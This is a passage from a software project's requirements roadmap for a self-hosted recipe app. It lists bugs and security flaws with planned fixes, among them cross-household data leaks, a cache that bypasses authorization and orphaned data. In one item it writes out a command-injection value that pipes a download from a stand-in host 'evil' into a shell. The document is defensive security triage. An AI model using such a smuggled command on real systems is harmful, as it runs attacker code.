  process correctly under EVERY bundler that compiles it, and must not discard the child's stderr.**
  `packages/shared-server/src/cooklang/pool.ts:320-328` resolves the child as "sibling of this module,
  with this module's extension" — correct for the tsdown bundle (`/app/dist-server/parse-worker.mjs`,
  verified healthy, 12/12 forks OK) and **wrong for Turbopack**, which polyfills `import.meta.url` to
  the original SOURCE path. It therefore forks
  `node_modules/@norish/shared-server/src/cooklang/parse-worker.ts`, which exists nowhere in the image:
  `fork()` succeeds with a real pid, the child exits 1 after ~80 ms, and
  `stdio:["ignore","ignore","ignore","ipc"]` (`pool.ts:420`) **throws away the `Cannot find module`
  stderr**, leaving only "never reported ready" — which is why an ordinary module-resolution error read
  as a mysterious pool failure. Broken on every image since `59f3a767 feat(27-04)`; became visible only
  when W5's boot backfill minted the first-ever `cook_source` on 2026-07-28. **Blast radius is RENDER
  ONLY, not import** (the mint path runs in `dist-server`, where resolution is correct); the cost to the
  user is no inline ingredient chips, no per-step scaling, no section headings and no concurrent timers
  on every recipe open. The stored `cook_source` for the live recipe **is valid** — `ok:true`, 10
  ingredients, through the working worker — so `"stored-source-did-not-parse"` is a misnomer for "the
  pool did not start". The stderr discard is justified in-code by T-27-05 (a WASM panic must not leak
  into a shared log stream); the fix is to **capture and log it under the module's own logger**, not to
  keep it dark. The documented escape hatch `NORISH_COOK_PARSE_WORKER_PATH` (`pool.ts:321`) would work
  today as an operational stop-gap. **Verification must be against the deployed image, not a unit
  test** — this is precisely the defect a unit test could not see.
- [ ] **PENDING-ISO-02** (Phase 27.4, closes F-12 + F-5) — **SECURITY-CRITICAL (ASVS L2). Every
  procedure in `packages/trpc/src/routers/recipes/pending.ts` must honour the active permission-policy
  clamp; no procedure may disclose recipe identifiers across households.** Two distinct leaks remain
  after 27.1-06 fixed `getPending`: (a) `getPendingAutoTagging` (`:79-84`) and
  `getPendingAllergyDetection` (`:141-145`) filter on `job.data.userId === ctx.user.id || job.data.
  householdKey === ctx.householdKey` — that **`||` ignores the `view:"owner"` clamp** `getPending:31-34`
  applies, leaking household-mates' recipe IDs under an owner-only policy; (b) the four `is*` job probes
  — `isNutritionEstimating` (`:50-66`), `isAutoTagging` (`:94-110`), `isAutoCategorizing` (`:112-128`),
  `isAllergyDetecting` (`:158-174`) — answer `jobs.some(j => j.data.recipeId === input.recipeId)` with
  **no ownership check at all**, a boolean oracle over any recipe UUID ("authenticating is not
  authorizing", per AGENTS.md). This is the fifth and sixth member of the REALTIME-ISO-01 /
  IMPORT-DEDUP-ISO-01 / LIST-ISO-01 / PENDING-ISO-01 family: a code path reading `everyone` as
  *unscoped* rather than clamping it to the cookbook. Fix by folding into the same household clamp the
  siblings use — do not invent a new shape. **Per CLAUDE.md this requires the adversarial revert-check:**
  RED-first suites with a `view:"everyone"` sibling for every case, then temporarily weaken the
  boundary, confirm the suites go RED, revert byte-identically, and never commit the weakening.
- [ ] **ACCT-DEL-01** (Phase 27.4, closes F-13) — **DATA LOSS, live and user-reachable. Deleting an
  account or a household must not orphan recipes into an unreachable state.** `deleteAccount`
  (`packages/trpc/src/routers/user/user.ts:279-318` → `deleteUser`,
  `packages/db/src/repositories/users.ts:347-349`) leaves the account's personal recipes with **both
  `user_id` and `household_id` NULL** — permanently invisible, undeletable, media retained on disk.
  Root cause: `recipes.household_id` and `recipes.user_id` are `ON DELETE SET NULL`, not cascade, so
  the FK semantics require **explicit** handling at every deletion site rather than being relied on.
  Decide the behaviour deliberately (cascade the personal rows, or refuse the delete until they are
  moved) and implement it. Related and in scope: `deleteHousehold`
  (`packages/db/src/repositories/households.ts:126`) is dead code **and** hazardous — a bare delete
  against the same SET NULL FK. **Delete it; do not give it a caller.** Acceptance: after deleting an
  account, no recipe row exists with both `user_id` and `household_id` NULL.
- [ ] **SW-CACHE-01** (Phase 27.4, closes F-14) — **SECURITY. The service worker must not serve
  access-controlled media from cache without revalidation, and must purge cached user data on
  sign-out.** Recipe media at `/recipes/{id}/{filename}` is not under `/api/`, so `apps/web/public/sw.js:65`
  serves it `cacheFirst` from CacheStorage **forever, never revalidated, bypassing
  `requireRecipeMediaAccess`** — a client-side cache defeating a server-side authorization check. All
  GET `/api/**` responses are additionally persisted unconditionally, and there is no cache purge on
  sign-out, so a shared device retains one user's data for the next. Compounding it,
  `apps/web/scripts/update-sw-version.js` is a **no-op** — it replaces `__CACHE_VERSION__`, a token that
  exists nowhere; `sw.js:1` hardcodes `norish-cache-v0.3.0-beta`, so the cache name has never changed
  across releases and the eviction branch has never once fired. All four must be fixed together: the
  media rule, the blanket `/api/**` persistence, the sign-out purge, and the version no-op.
- [ ] **OPS-01** (Phase 27.4, closes F-15 + F-18 + F-21) — **Operator tooling guards must not be
  bypassable, and secrets that have been exposed must be rotated.** Three items: (a)
  `tooling/beta/clone-beta-db.sh`'s live-DB guard matches `*"norish-beta"*` against the **whole
  connection string**, so it also matches the **password** — a live connection string with the right
  password passes the guard and reaches `pg_restore --clean`. Match the database name, not the URL.
  (b) **The DeepSeek API key must be rotated** — it was exposed in a session transcript and was briefly
  written to `/tmp` on 2026-07-28. Confirmed NOT in the git tree; rotation is still mandatory, and the
  acceptance test is that the key in use on live is a new one. (c) F-21:
  `tooling/cross-ai/antigravity-executor.sh:46,48` interpolates `$MODEL` / `$AGY` / `$SANDBOX`
  unquoted into a string handed to `script -c`, which executes it via `sh -c` — command injection from
  config (`NORISH_GEMINI_MODEL='x"; curl evil|sh; #'`), in a script that runs unattended from cron —
  and `|| true` on `:48` **discards the executor's exit status**, breaking `worker.sh`'s documented
  "exit code is the executor's" contract so a hard failure that printed something is filed as `done/`
  with a bogus SUMMARY. That directly undermines CLAUDE.md's "never trust the worker's self-reported
  Self-Check": there is not even a reliable failure signal to distrust. Full detail: WR-11 in
  `27.1-REVIEW-C-apps-tooling.md`.
- [ ] **DEADCODE-01** (Phase 27.5) — **Unreferenced code must be removed, and every deletion must be
  justified against a real reachability check rather than a naive search.** ~3 300 lines are deletable
  at HIGH confidence per three independent adversarial sweeps produced 2026-07-28, each with hand-built
  reachability graphs (there is no `knip`/`ts-prune` in this repo) and each documenting its own method
  so any claim can be falsified: `27.1-REVIEW-A-import-surface.md` (api, queue, parser-api; 41 files,
  23 findings, ~2 115 lines), `27.1-REVIEW-B-data-server.md` (db, db-schema, trpc, auth, shared-server,
  shared; 309 files, 22 findings, ~1 150 lines), `27.1-REVIEW-C-apps-tooling.md` (web, mobile, ui,
  shared-react, i18n, config, tooling, docker, root config; 1 169 files, 42 findings). **Execute the
  reports; do not re-derive them.** Every deletion cites the section that justifies it. Three recorded
  traps must each be re-checked explicitly, because a naive search gets all three wrong:
  `packages/api/src/parser/jsonld.ts:2` carries a **FALSE** `@deprecated` comment (27.1 put that file on
  the LIVE path in four places — fix the comment, do not delete the file);
  `LEGACY_RECIPE_PARSER_ROLLBACK` is set nowhere and enabling it is *actively worse* than the default;
  and `db-schema/relations.ts` **looks orphaned but is LIVE**, consumed via drizzle relational queries
  that no import graph will show you. Gate: full `pnpm test`/`typecheck`/`lint` green **after** GATE-01
  made those gates real — which is why 27.5 sequences behind 27.3.
- [ ] **COOK-02** (Phase 27.6, completes COOK-01) — **Cooklang is the single source of truth.** Kiran,
  2026-07-28, binding: *"Ik wil cooklang als de enige source of truth hebben. de rest mag er allemaal
  uitgesloopt worden."* Cooklang-only IS the destination; this requirement is about ORDER, not whether.
  `.cook` becomes the single representation: `recipes.cook_source` is NOT NULL (migration `0043`) and
  the legacy render fork, `unit-converter.ts`, the heuristic ingredient-link markup and the
  timer-keyword scan are deleted. **The NOT NULL constraint may be written ONLY AFTER all of the
  following are TRUE** — these are gates, not preferences, and four of them are other phases' output:
  (1) COOKPOOL-01's parse-pool fix holds in **both** bundles, proven against the deployed image;
  (2) **every** write path mints a `cook_source` — structured URL import
  (`packages/api/src/parser/index.ts:420-427`, which today deliberately returns `cook: null` per
  D-27-W3-08), paste-import (`packages/queue/src/…/worker.ts:136`), Mealie archive import
  (`packages/shared-server/src/archive/parser.ts:364`), manual create
  (`packages/trpc/src/routers/recipes/recipes.ts:222`), and recipe copy; (3) the unit-system toggle
  **preserves** it — `setActiveSystemForRecipe` (`packages/db/src/repositories/recipes.ts:1150-1156`)
  today deliberately NULLs `cook_source` on a metric↔US switch, which is correct under a nullable column
  and an outright constraint violation under a NOT NULL one, so it must re-mint or translate rather
  than clear; (4) the 8 000 ms wall backstop plus 27-04's `cookParseCpuMs: 1_500` CPU gate still hold
  once every write path runs the mint; **(5) F-19 is discharged** — the live derives sit at 0.000
  confidence over pre-existing duplicate bilingual `steps` rows, and a NOT NULL contract over data that
  bad would lock the bad derives in permanently. **The recorded justification for the original W6 is
  FALSE and is corrected, not overwritten:** `27-ARCHITECTURE.md:320` says W6 is *"Safe because W5
  guaranteed 100% coverage"* — W5 covered **existing rows** (`candidates:6, derived:1, flagged:5`), said
  nothing about future inserts, and said nothing about the read path, which has itself been broken since
  `59f3a767`. Shipping W6 as written would break five write paths and render zero steps on 100% of
  recipes. Migration `0043` is **irreversible**: it requires a verified-restorable backup and Kiran's
  explicit sign-off, per the Phase 22.4 / 25 / 27-07 migration discipline.

### Correctness / fork-maintenance fixes

- **UNIT-NORM-01** (Phase 19) — The recipe UPDATE path must normalize locale-specific ingredient unit terms to canonical IDs identically to the CREATE path. `syncRecipeIngredientsTx` (`packages/db/src/repositories/recipes.ts`) wrote `unit: ingredient.unit ?? null` verbatim, so editing a recipe persisted un-normalized units (e.g. Dutch "handvol" instead of "handful"). Fix: export `getUnitsForNormalization` from `ingredients.ts` and apply `normalizeUnit(ingredient.unit ?? "", units)` at the single update site — mirroring `attachIngredientsToRecipeByInputTx`. Closes the 3 `updateRecipeWithRefs` failures in `ingredient-unit-normalization.test.ts` that Phase 18 logged as out-of-scope. No schema/migration; no security surface.

### Upstream incorporation

- [x] **UPSTREAM-019** (Phase 20) — Incorporate upstream `norish-recipes/norish` **v0.19.0-beta** (PR #468, squashed commit `1f684480`) into the fork on a dedicated integration branch off `main`, re-asserting the fork's hard constraints at every conflict (Camoufox-not-Chrome — `packages/api/src/parser/fetch.ts`, never reintroduce `playwright.ts`/headless Chrome; per-cookbook isolation HOUSE-06 stays green; config-as-code env sync in `seed-config.ts`; WorkOS + multi-household + per-cookbook permissions in `auth.ts`/`permissions.ts`/`claim-processor.ts`) and reconciling our `packages/db/src/schema` (multi-household, `recipe_shares`, `recipe_ratings`, `visibility`, per-cookbook policy columns, migrations 0035–0038) against upstream's NEW `packages/db-schema/` package split. ~996 files changed upstream, ~110 overlap our fork. Hard gates: per-cookbook isolation + db/queue testcontainer suites under `sg docker`, full typecheck/lint/test green, then a director-owned `pnpm docker:build`. Off the live stack throughout (live cutover is a separate, deliberate step). Full assessment: vault `norish-upstream-0.19.0-incorporation-assessment`.

### UI polish & media UX — Phase 21 (from the 2026-07-21 UAT)

- [ ] **MEDIA-UX-01** (Phase 21) — Opening a recipe's media must keep the user in the same media set. Today `media-carousel.tsx` builds the lightbox from `items.filter(type === "image")`, so a recipe with 1 photo + N videos opens a single-image lightbox with no position counter, no prev/next and no thumbnail strip — the media you were swiping disappears. The lightbox must expose the full media set (or at minimum every image) with counter + navigation, and returning from it must leave the carousel on the same item. Additionally, thumbnails must not download the full-size original into a 64px slot (`unoptimized` + `sizes="64px"` in `components/ui/carousel.tsx`); verify against a browser network trace. Source: UAT section A3.
- [ ] **UI-POLISH-01** (Phase 21) — Reduce visual and functional chrome so the app reads as a polished product rather than self-hostable software — *"every pixel must earn its place; most should lose"*. Concretely: strip the settings surface to what a normal user needs (removals are reversible), replace the wonky mobile-nav profile avatar, and rework the calendar into tappable rows of 7 that expand into a single day while hiding empty past days. Primarily SUBTRACTIVE. Source: UAT section D.

### Shopping list — Phase 25

- [ ] **SHOP-02** (Phase 25) — **DECIDED 2026-07-21 by Kiran: only a household should share a shopping list.** Today `groceries` and `stores` are keyed on `user_id` with **no `household_id`** (`packages/db-schema/src/schema/{groceries,stores}.ts`), so members of a shared cookbook keep two separate lists — a real gap in the Phase 2 multi-household work, not an intentional design. Re-key the grocery/store surface onto `household_id` so a cookbook's members see and edit one list, with a migration that assigns each existing user's items to their own household (no data loss, no cross-household merge of pre-existing items). Isolation still applies: a member never sees a list for a household they don't belong to (HOUSE-06). **Settles the Phase 25 data model** — the aisle-category mapping (SHOP-01) keys on `household_id` too, so both land in one migration rather than two.

### Realtime correctness — Phase 22 (found 2026-07-21 while sequencing the roadmap)

- [ ] **REALTIME-ISO-01** (Phase 22) — **BUG, live today.** Realtime events do not honour per-cookbook isolation. `emitByPolicy` (`packages/shared-server/src/realtime/policy.ts`) maps `view: "everyone"` onto `emitter.broadcast()`; of the 54 `emitByPolicy(` call sites in `packages/queue/src` + `packages/trpc/src`, **34 resolve their policy from the server-wide `getRecipePermissionPolicy()`** rather than the recipe's own household. Live `server_config.recipe_permission_policy` is `{"edit":"household","view":"everyone","delete":"household"}` (queried against the live DB 2026-07-21), so the broadcast branch is the *active* branch in production, and the payloads are full dashboard DTOs (e.g. `emitByPolicy(..., "imported", { recipe: dashboardDto, ... })`) — not bare ids. Net effect: **every connected client is pushed every household's imports, updates, ratings and shares.** Phase 3 proved HOUSE-06 adversarially on the REST/tRPC path only; the socket path was never covered. Fix in code by resolving the policy from the recipe's OWN household (the `canAccessResource` / `getHouseholdPolicy` precedent) — **not** by flipping the live config, which would mask the bug while leaving `view: "everyone"` a foot-gun. Sequenced ahead of all feature work because Phases 24, 26 and 30 each add emit sites.

### Cookbook & import UX — Phases 23–24 (from the 2026-07-21 UAT)

- [ ] **CKBK-MOVE-01** (Phase 23) — A recipe must show which cookbook it belongs to, and be movable between cookbooks. Today the cookbook is an invisible scoping rule: nothing on the recipe view names it and there is no move affordance, so the multi-cookbook model shipped in Phase 2 is illegible to the user. Add the cookbook to the recipe detail view; tapping it offers a move to any cookbook the user may write to (edit rights on the source per POLICY-01, membership of the destination, never widening access per HOUSE-06); add a Cookbooks browser to the nav. **Open**: whether a moved recipe's ratings and share links travel with it — a move can otherwise silently expose or hide who rated what. Source: UAT section B3.
- [ ] **IMPORT-UX-01** (Phase 24) — A running import must report honest progress derived from real job state (fetch → parse → enrich), not a synthetic timer and not an indefinite skeleton card; where a stage's duration is genuinely unknown the UI should say so rather than fake a bar. Kiran: import "can feel a bit slow at times". Rides the realtime bus, so it **depends on REALTIME-ISO-01** — otherwise one user's import progress broadcasts to everyone. Source: UAT section B2.

### Deferred pending a product decision (not scheduled)

_(SHOP-02 previously sat here as an open decision. **Decided 2026-07-21 by Kiran** — shopping lists are HOUSEHOLD-scoped, not per-user — so it moved up into the "Shopping list — Phase 25" section above as a real requirement.)_

### Explicitly out of scope

| Feature | Reason |
|---------|--------|
| "I made this" log | Out of scope (recorded) |
| Activity feed | Out of scope (recorded) |
| Export / print | Out of scope (recorded) |
| Recipe requests | Out of scope (recorded) |
| Pantry / inventory | **Dropped** — "what can I make" is image-based (MAKE-01), not pantry-driven |
